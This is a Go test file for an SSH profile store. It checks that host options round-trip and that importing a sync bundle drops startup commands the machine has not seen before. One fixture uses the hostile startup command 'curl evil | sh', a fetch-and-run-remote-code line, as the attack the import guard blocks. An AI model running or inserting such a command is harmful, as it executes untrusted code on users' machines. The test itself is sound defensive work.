package store

import "testing"

func TestHostOptionsRoundTrip(t *testing.T) {
	s, _, _ := openTest(t)
	opts := HostOptions{Color: "red", StartupCommands: "sudo -i\ncd /app", Encoding: "koi8-r", ThemeID: "solarized-dark"}
	must(t, s.SaveSSHProfile(SSHProfile{ID: "h", Name: "prod", Host: "h", Port: 22, Username: "u", AuthType: "key", Options: opts}))
	p, err := s.GetSSHProfile("h")
	must(t, err)
	if p.Options != opts {
		t.Fatalf("options = %+v", p.Options)
	}
	list, err := s.ListSSHProfiles()
	must(t, err)
	if len(list) != 1 || list[0].Options != opts {
		t.Fatalf("list options = %+v", list)
	}
}

// Startup commands from a sync file run on their own at the next login, so
// an import drops them unless this machine already had the same ones.
func TestImportDropsNewStartupCommands(t *testing.T) {
	s, _, _ := openTest(t)
	must(t, s.SaveSSHProfile(SSHProfile{ID: "same", Name: "a", Host: "a", Port: 22, Username: "u", AuthType: "key", Options: HostOptions{StartupCommands: "uptime"}}))
	b := Bundle{Version: BundleVersion, SSH: []SSHProfile{
		{ID: "same", Name: "a", Host: "a", Port: 22, Username: "u", AuthType: "key", Options: HostOptions{StartupCommands: "uptime", Color: "red"}},
		{ID: "new", Name: "b", Host: "b", Port: 22, Username: "u", AuthType: "key", Options: HostOptions{StartupCommands: "curl evil | sh", Encoding: "cp866"}},
	}}
	res, err := s.ImportBundle(b)
	must(t, err)
	if res.FlagsReset != 1 {
		t.Fatalf("FlagsReset = %d", res.FlagsReset)
	}
	kept, _ := s.GetSSHProfile("same")
	if kept.Options.StartupCommands != "uptime" || kept.Options.Color != "red" {
		t.Fatalf("known commands should stay: %+v", kept.Options)
	}
	fresh, _ := s.GetSSHProfile("new")
	if fresh.Options.StartupCommands != "" || fresh.Options.Encoding != "cp866" {
		t.Fatalf("new commands should be dropped, other options kept: %+v", fresh.Options)
	}
}
